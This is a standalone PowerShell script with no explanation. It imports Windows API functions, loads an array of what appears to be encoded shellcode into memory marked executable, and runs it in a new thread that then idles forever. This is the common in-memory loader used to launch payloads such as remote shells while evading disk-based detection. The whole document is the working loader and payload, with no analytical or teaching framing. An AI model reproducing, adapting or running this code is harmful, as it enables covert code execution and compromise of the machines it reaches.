$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xdf,0xd9,0x74,0x24,0xf4,0x5a,0xbf,0x81,0xa3,0xaf,0x90,0x31,0xc9,0xb1,0x4b,0x31,0x7a,0x1a,0x83,0xea,0xfc,0x03,0x7a,0x16,0xe2,0x74,0x5f,0x47,0x12,0x76,0xa0,0x98,0x73,0xff,0x45,0xa9,0xb3,0x9b,0x0e,0x9a,0x03,0xe8,0x43,0x17,0xef,0xbc,0x77,0xac,0x9d,0x68,0x77,0x05,0x2b,0x4e,0xb6,0x96,0x00,0xb2,0xd9,0x14,0x5b,0xe6,0x39,0x24,0x94,0xfb,0x38,0x61,0xc9,0xf1,0x69,0x3a,0x85,0xa7,0x9d,0x4f,0xd3,0x7b,0x15,0x03,0xf5,0xfb,0xca,0xd4,0xf4,0x2a,0x5d,0x6e,0xaf,0xec,0x5f,0xa3,0xdb,0xa5,0x47,0xa0,0xe6,0x7c,0xf3,0x12,0x9c,0x7f,0xd5,0x6a,0x5d,0xd3,0x18,0x43,0xac,0x2a,0x5c,0x64,0x4f,0x59,0x94,0x96,0xf2,0x59,0x63,0xe4,0x28,0xec,0x70,0x4e,0xba,0x56,0x5d,0x6e,0x6f,0x00,0x16,0x7c,0xc4,0x47,0x70,0x61,0xdb,0x84,0x0a,0x9d,0x50,0x2b,0xdd,0x17,0x22,0x0f,0xf9,0x7c,0xf0,0x2e,0x58,0xd9,0x57,0x4f,0xba,0x82,0x08,0xf5,0xb0,0x2f,0x5c,0x84,0x9a,0x27,0x91,0xa4,0x24,0xb8,0xbd,0xbf,0x57,0x8a,0x62,0x6b,0xf0,0xa6,0xeb,0xb5,0x07,0xc8,0xc1,0x01,0x97,0x37,0xea,0x71,0xb1,0xf3,0xbe,0x21,0xa9,0xd2,0xbe,0xaa,0x29,0xda,0x6a,0x7c,0x7a,0x74,0xc5,0x3c,0x2a,0x34,0xb5,0xd4,0x20,0xbb,0xea,0xc4,0x4a,0x11,0x83,0x6e,0xb0,0xf2,0x6c,0xc6,0xce,0x81,0x05,0x14,0x2f,0x87,0x6e,0x91,0xc9,0xed,0x80,0xf7,0x42,0x9a,0x39,0x52,0x18,0x3b,0xc5,0x49,0x64,0x7b,0x4d,0x7b,0x98,0x32,0xa6,0x0e,0x8a,0x23,0x89,0xf0,0x52,0xb4,0x9c,0xf0,0x38,0xb0,0x36,0xa7,0xd4,0xba,0x6f,0x8f,0x7a,0x44,0x5a,0x8c,0x7d,0xba,0x1b,0x7b,0xf6,0x8d,0x89,0x3b,0x61,0xf2,0x5d,0xbb,0x71,0xa4,0x37,0xbb,0x19,0x10,0x6c,0xe8,0x3c,0x5f,0xb9,0x9d,0xec,0xca,0x42,0xf7,0x41,0x5c,0x2b,0xf5,0xbc,0xaa,0xf4,0x06,0xeb,0xa8,0xf3,0xf8,0x6a,0x6c,0x02,0x3b,0xbb,0xb4,0x70,0x52,0x7f,0x83,0x8b,0x11,0x22,0xa2,0x01,0x59,0x70,0xb4,0x03;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};